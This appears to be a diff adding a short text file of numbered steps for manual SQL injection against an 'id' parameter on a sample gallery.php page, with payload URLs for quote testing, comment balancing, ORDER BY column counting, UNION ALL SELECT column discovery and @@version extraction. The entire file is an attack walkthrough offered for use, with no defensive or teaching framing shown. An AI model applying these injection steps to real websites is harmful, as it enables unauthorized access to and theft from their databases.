@@ -1,0 +1,10 @@
+Steps-
+
+1- http://www.abc.com/gallery.php?id=1 (insert ' after number check website data is hiding or generate sql error)
+2-after use --+ for balance a query ( http://www.abc.com/gallery.php?id='--+
+3-find Column number use ( http://www.abc.com/gallery.php?id=' order by 1--+)
+increase a number and check column number
+4-Check vulnerable column use union all select command ( http://www.abc.com/gallery.php?id=' union all select 1,2,3--+) put number of column value
+5-find vulnerable column number then use version command @@version
+6-put @@version command in vulnerable column number.
+
